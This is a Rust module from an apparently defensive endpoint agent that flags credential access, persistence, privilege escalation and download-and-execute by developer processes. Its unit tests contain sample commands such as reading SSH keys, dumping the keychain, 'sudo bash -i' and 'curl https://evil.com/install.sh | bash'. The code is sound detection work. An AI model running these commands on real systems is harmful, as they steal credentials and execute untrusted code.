// Scope violation detection for developer use case.
// Core philosophy: silence unless something actually matters.
// Clean executions (npm install, cargo build, git pull) produce no output.
// Only actual scope violations — credential access, unexpected network exfil,
// persistence installation, privilege escalation — generate notifications.

use chrono::{DateTime, Utc};
use crate::execution_context::{ExecutionContext, ExecutionSource};
use crate::models::{ProcessInfo, TelemetryEvent};

#[derive(Debug, Clone, PartialEq)]
pub enum ViolationKind {
    CredentialAccess,     // Accessing ~/.ssh, ~/.aws, keychain, cloud creds
    UnexpectedNetwork,    // Outbound connection from a process that shouldn't make them
    PersistenceInstall,   // LaunchAgent/Daemon creation, crontab modification
    PrivilegeEscalation,  // sudo abuse, setuid modification, PAM config changes
    SuspiciousDownload,   // curl|bash, downloading executables to /tmp
}

impl ViolationKind {
    pub fn as_str(&self) -> &'static str {
        match self {
            ViolationKind::CredentialAccess => "credential_access",
            ViolationKind::UnexpectedNetwork => "unexpected_network",
            ViolationKind::PersistenceInstall => "persistence_install",
            ViolationKind::PrivilegeEscalation => "privilege_escalation",
            ViolationKind::SuspiciousDownload => "suspicious_download",
        }
    }

    pub fn severity(&self) -> &'static str {
        match self {
            ViolationKind::CredentialAccess => "high",
            ViolationKind::UnexpectedNetwork => "medium",
            ViolationKind::PersistenceInstall => "high",
            ViolationKind::PrivilegeEscalation => "high",
            ViolationKind::SuspiciousDownload => "high",
        }
    }
}

pub struct ScopeViolation {
    pub kind: ViolationKind,
    pub event_type: &'static str,
    pub reason: String,
    pub process: String,
    pub args: String,
}

// Credential paths that a developer build/test process should never touch
static CREDENTIAL_PATHS: &[&str] = &[
    "/.ssh/id_",
    "/.ssh/config",
    "/.aws/credentials",
    "/.aws/config",
    "/.azure/credentials",
    "/.config/gcloud/",
    "/.kube/config",
    "/.docker/config.json",
    "/Library/Keychains/",
    "login.keychain",
    "System.keychain",
    "security dump-keychain",
    "security find-generic-password",
    "security find-internet-password",
];

// LaunchAgent/Daemon paths indicating persistence
static PERSISTENCE_PATHS: &[&str] = &[
    "/Library/LaunchAgents/",
    "/Library/LaunchDaemons/",
    "~/Library/LaunchAgents/",
    "/etc/periodic/",
    "/var/at/jobs/",
];

// Persistence-related commands
static PERSISTENCE_COMMANDS: &[&str] = &[
    "launchctl load",
    "launchctl bootstrap",
    "PlistBuddy",
    "defaults write com.apple.loginwindow",
    "defaults write com.apple.dock",
];

// Privilege escalation indicators
static PRIV_ESC_PATTERNS: &[&str] = &[
    "sudo -s",
    "sudo su",
    "sudo bash",
    "sudo sh",
    "sudo zsh",
    "chmod +s",
    "chmod u+s",
    "chmod 4755",
    "chown root",
];

// Download-then-execute patterns
static SUSPICIOUS_DOWNLOAD_PATTERNS: &[&str] = &[
    "| bash",
    "| sh",
    "| zsh",
    "|bash",
    "|sh",
    "|zsh",
    "bash <(",
    "sh <(",
];

pub fn detect_scope_violations(
    process: &ProcessInfo,
    ctx: &ExecutionContext,
    now: DateTime<Utc>,
) -> Vec<TelemetryEvent> {
    let mut events = Vec::new();

    let cmd_lower = process.command.to_lowercase();
    let args_lower = process.args.to_lowercase();
    let cmd_basename = process.command.rsplit('/').next().unwrap_or(&process.command).to_lowercase();
    let full_invocation = format!("{} {}", cmd_lower, args_lower);

    // 1. Credential access — any process reading credential files/keychains
    let cred_hit = CREDENTIAL_PATHS.iter().find(|&&path| {
        args_lower.contains(path) || full_invocation.contains(path)
    });
    if let Some(&matched_path) = cred_hit {
        events.push(make_event(
            now,
            "alert_scope_credential_access",
            process,
            ctx,
            ViolationKind::CredentialAccess,
            format!(
                "{} accessed credential path: {}",
                cmd_basename, matched_path
            ),
        ));
    }

    // Also catch: `security` command accessing keychain
    if cmd_basename == "security" {
        let keychain_ops = ["dump-keychain", "find-generic-password", "find-internet-password", "export"];
        if keychain_ops.iter().any(|&op| args_lower.contains(op)) {
            events.push(make_event(
                now,
                "alert_scope_keychain_access",
                process,
                ctx,
                ViolationKind::CredentialAccess,
                format!("security command accessed keychain: security {}", process.args),
            ));
        }
    }

    // 2. Persistence installation
    let persist_path_hit = PERSISTENCE_PATHS.iter().find(|&&path| {
        args_lower.contains(&path.to_lowercase()) || full_invocation.contains(&path.to_lowercase())
    });
    if let Some(&matched_path) = persist_path_hit {
        events.push(make_event(
            now,
            "alert_scope_persistence_install",
            process,
            ctx,
            ViolationKind::PersistenceInstall,
            format!("Process wrote to persistence path: {}", matched_path),
        ));
    }

    let persist_cmd_hit = PERSISTENCE_COMMANDS.iter().find(|&&cmd| {
        full_invocation.contains(cmd)
    });
    if let Some(&matched_cmd) = persist_cmd_hit {
        events.push(make_event(
            now,
            "alert_scope_persistence_command",
            process,
            ctx,
            ViolationKind::PersistenceInstall,
            format!("Persistence command executed: {}", matched_cmd),
        ));
    }

    // 3. Privilege escalation
    let priv_esc_hit = PRIV_ESC_PATTERNS.iter().find(|&&pattern| {
        full_invocation.contains(pattern)
    });
    if let Some(&matched_pattern) = priv_esc_hit {
        events.push(make_event(
            now,
            "alert_scope_privilege_escalation",
            process,
            ctx,
            ViolationKind::PrivilegeEscalation,
            format!("Privilege escalation pattern: {}", matched_pattern),
        ));
    }

    // 4. Suspicious download-and-execute (curl/wget piping to shell)
    if matches!(cmd_basename.as_str(), "curl" | "wget" | "fetch") {
        let download_hit = SUSPICIOUS_DOWNLOAD_PATTERNS.iter().find(|&&pattern| {
            args_lower.contains(pattern)
        });
        if let Some(&matched_pattern) = download_hit {
            events.push(make_event(
                now,
                "alert_scope_suspicious_download",
                process,
                ctx,
                ViolationKind::SuspiciousDownload,
                format!("Download piped to shell: {} {}", cmd_basename, matched_pattern),
            ));
        }
    }

    // 5. Unexpected network: interpreter making direct outbound connections
    //    (e.g., a test runner doing curl to an external IP is unusual)
    //    Only flag when source is IDE or Terminal and the command is a known
    //    interpreter that shouldn't be making raw network calls.
    if matches!(ctx.source, ExecutionSource::IDE | ExecutionSource::Terminal) {
        let network_interpreters = ["python", "python3", "ruby", "node", "deno", "perl"];
        if network_interpreters.iter().any(|&interp| cmd_basename.starts_with(interp)) {
            let network_flags = ["-c", "--eval", "-e"];
            if network_flags.iter().any(|&flag| args_lower.contains(flag)) {
                let network_patterns = ["socket", "urllib", "requests", "http", "https", "ftp"];
                if network_patterns.iter().any(|&pattern| args_lower.contains(pattern)) {
                    events.push(make_event(
                        now,
                        "alert_scope_interpreter_network",
                        process,
                        ctx,
                        ViolationKind::UnexpectedNetwork,
                        format!(
                            "Interpreter making inline network call: {} {}",
                            cmd_basename, process.args
                        ),
                    ));
                }
            }
        }
    }

    events
}

fn make_event(
    now: DateTime<Utc>,
    event_type: &'static str,
    process: &ProcessInfo,
    ctx: &ExecutionContext,
    kind: ViolationKind,
    reason: String,
) -> TelemetryEvent {
    TelemetryEvent::new(
        now,
        event_type,
        "core-agent/scope-violation",
        serde_json::json!({
            "severity": kind.severity(),
            "category": "scope_violation",
            "violation_kind": kind.as_str(),
            "execution_source": ctx.source.as_str(),
            "reason": reason,
            "details": {
                "command": process.command,
                "args": process.args,
                "pid": process.pid,
                "ppid": process.ppid,
                "parent_command": process.parent_command,
                "process_kind": process.process_kind,
            }
        }),
    )
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::execution_context::{ExecutionContext, ExecutionSource};
    use crate::models::{ProcessBehaviorFeatures, ProcessInfo};
    use chrono::Utc;

    fn make_process(command: &str, args: &str, parent: Option<&str>) -> ProcessInfo {
        ProcessInfo {
            pid: 1234,
            ppid: 100,
            command: command.to_string(),
            args: args.to_string(),
            process_kind: "user_app".to_string(),
            command_path_kind: "user_space".to_string(),
            parent_command: parent.map(|s| s.to_string()),
            parent_args: None,
            parent_process_kind: Some("unknown".to_string()),
            parent_command_path_kind: Some("unknown".to_string()),
            behavior: ProcessBehaviorFeatures::default(),
        }
    }

    fn make_ctx(source: ExecutionSource, process: &ProcessInfo) -> ExecutionContext {
        ExecutionContext {
            pid: process.pid,
            timestamp: Utc::now(),
            command: process.command.clone(),
            args: process.args.clone(),
            source,
            parent_command: process.parent_command.clone().unwrap_or_default(),
        }
    }

    #[test]
    fn test_detect_ssh_key_access() {
        let p = make_process("/usr/bin/cat", "~/.ssh/id_rsa", Some("/bin/zsh"));
        let ctx = make_ctx(ExecutionSource::Terminal, &p);
        let events = detect_scope_violations(&p, &ctx, Utc::now());
        assert!(events.iter().any(|e| e.event_type == "alert_scope_credential_access"));
    }

    #[test]
    fn test_detect_aws_credential_access() {
        let p = make_process("/usr/bin/cat", "~/.aws/credentials", Some("/bin/bash"));
        let ctx = make_ctx(ExecutionSource::Terminal, &p);
        let events = detect_scope_violations(&p, &ctx, Utc::now());
        assert!(events.iter().any(|e| e.event_type == "alert_scope_credential_access"));
    }

    #[test]
    fn test_detect_keychain_dump() {
        let p = make_process("/usr/bin/security", "dump-keychain -d login.keychain", Some("/bin/zsh"));
        let ctx = make_ctx(ExecutionSource::Terminal, &p);
        let events = detect_scope_violations(&p, &ctx, Utc::now());
        assert!(events.iter().any(|e| e.event_type == "alert_scope_keychain_access"));
    }

    #[test]
    fn test_detect_persistence_launchagent() {
        let p = make_process("/bin/launchctl", "load /Library/LaunchAgents/com.evil.plist", Some("/bin/zsh"));
        let ctx = make_ctx(ExecutionSource::Terminal, &p);
        let events = detect_scope_violations(&p, &ctx, Utc::now());
        assert!(events.iter().any(|e| e.event_type.starts_with("alert_scope_persist")));
    }

    #[test]
    fn test_detect_sudo_shell_escalation() {
        let p = make_process("/usr/bin/sudo", "bash -i", Some("/bin/zsh"));
        let ctx = make_ctx(ExecutionSource::Terminal, &p);
        let events = detect_scope_violations(&p, &ctx, Utc::now());
        assert!(events.iter().any(|e| e.event_type == "alert_scope_privilege_escalation"));
    }

    #[test]
    fn test_detect_curl_pipe_bash() {
        let p = make_process("/usr/bin/curl", "-s https://evil.com/install.sh | bash", Some("/bin/zsh"));
        let ctx = make_ctx(ExecutionSource::Terminal, &p);
        let events = detect_scope_violations(&p, &ctx, Utc::now());
        assert!(events.iter().any(|e| e.event_type == "alert_scope_suspicious_download"));
    }

    #[test]
    fn test_no_violation_for_clean_git_pull() {
        let p = make_process("/usr/bin/git", "pull origin main", Some("/bin/zsh"));
        let ctx = make_ctx(ExecutionSource::Terminal, &p);
        let events = detect_scope_violations(&p, &ctx, Utc::now());
        assert!(events.is_empty(), "git pull should not trigger any scope violations");
    }

    #[test]
    fn test_no_violation_for_cargo_build() {
        let p = make_process("/Users/user/.cargo/bin/cargo", "build --release", Some("/usr/share/cursor/cursor"));
        let ctx = make_ctx(ExecutionSource::IDE, &p);
        let events = detect_scope_violations(&p, &ctx, Utc::now());
        assert!(events.is_empty(), "cargo build should not trigger any scope violations");
    }

    #[test]
    fn test_no_violation_for_npm_install() {
        let p = make_process("/usr/local/bin/npm", "install", Some("/usr/share/code/code"));
        let ctx = make_ctx(ExecutionSource::IDE, &p);
        let events = detect_scope_violations(&p, &ctx, Utc::now());
        assert!(events.is_empty(), "npm install should not trigger any scope violations");
    }
}
